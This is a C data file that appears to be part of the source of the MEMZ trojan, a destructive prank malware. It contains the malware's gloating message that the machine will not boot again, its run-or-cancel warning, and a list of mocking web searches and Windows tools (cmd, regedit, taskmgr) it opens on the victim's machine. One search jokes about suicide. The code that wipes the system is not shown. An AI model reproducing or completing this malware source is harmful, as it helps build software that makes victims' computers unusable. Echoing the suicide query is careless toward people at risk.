const unsigned char msg[] = "YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n\r\nYour computer won't boot up again,\r\nso use it as long as you can!\r\n\r\n:D\r\n\r\nTrying to kill MEMZ will cause your system to be\r\ndestroyed instantly, so don't try it :D";

const unsigned char warning[] = "The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?";

const char *sites[] = {
    "http://google.co.ck/search?q=best+way+to+kill+yourself",
    "http://google.co.ck/search?q=how+2+remove+a+virus",
    "http://google.co.ck/search?q=mcafee+vs+norton",
    "http://google.co.ck/search?q=how+to+send+a+virus+to+my+friend",
    "http://google.co.ck/search?q=minecraft+hax+download+no+virus",
    "http://google.co.ck/search?q=how+to+get+money",
    "http://google.co.ck/search?q=bonzi+buddy+download+free",
    "http://google.co.ck/search?q=how+2+buy+weed",
    "http://google.co.ck/search?q=how+to+code+a+virus+in+visual+basic",
    "http://google.co.ck/search?q=what+happens+if+you+delete+system32",
    "http://google.co.ck/search?q=g3t+r3kt",
    "http://google.co.ck/search?q=batch+virus+download",
    "http://google.co.ck/search?q=virus.exe",
    "http://google.co.ck/search?q=internet+explorer+is+the+best+browser",
    "http://google.co.ck/search?q=facebook+hacking+tool+free+download+no+virus+working+2016",
    "http://google.co.ck/search?q=virus+builder+legit+free+download",
    "http://google.co.ck/search?q=how+to+create+your+own+ransomware",
    "http://google.co.ck/search?q=how+to+remove+memz+trojan+virus",
    "http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp",
    "http://google.co.ck/search?q=dank+memz",
    "http://google.co.ck/search?q=how+to+download+memz",
    "http://google.co.ck/search?q=half+life+3+release+date",
    "http://google.co.ck/search?q=is+illuminati+real",
    "http://google.co.ck/search?q=montage+parody+making+program+2016",
    "http://google.co.ck/search?q=the+memz+are+real",
    "http://google.co.ck/search?q=stanky+danky+maymays",
    "http://google.co.ck/search?q=john+cena+midi+legit+not+converted",
    "http://google.co.ck/search?q=vinesauce+meme+collection",
    "http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi",
    "http://answers.microsoft.com/en-us/protect/forum/protect_other-protect_scanning/memz-malwarevirus-trojan-completely-destroying/268bc1c2-39f4-42f8-90c2-597a673b6b45",
    "http://motherboard.vice.com/read/watch-this-malware-turn-a-computer-into-a-digital-hellscape",
    "http://play.clubpenguin.com",
    "http://pcoptimizerpro.com",
    "http://softonic.com",
    "calc",
    "notepad",
    "cmd",
    "write",
    "regedit",
    "explorer",
    "taskmgr",
    "msconfig",
    "mspaint",
    "devmgmt.msc",
    "control",
    "mmc",
};

const size_t nSites = sizeof(sites) / sizeof(void *);

const char *sounds[] = {
    "SystemHand",
    "SystemQuestion",
    "SystemExclamation"};

const size_t nSounds = sizeof(sounds) / sizeof(void *);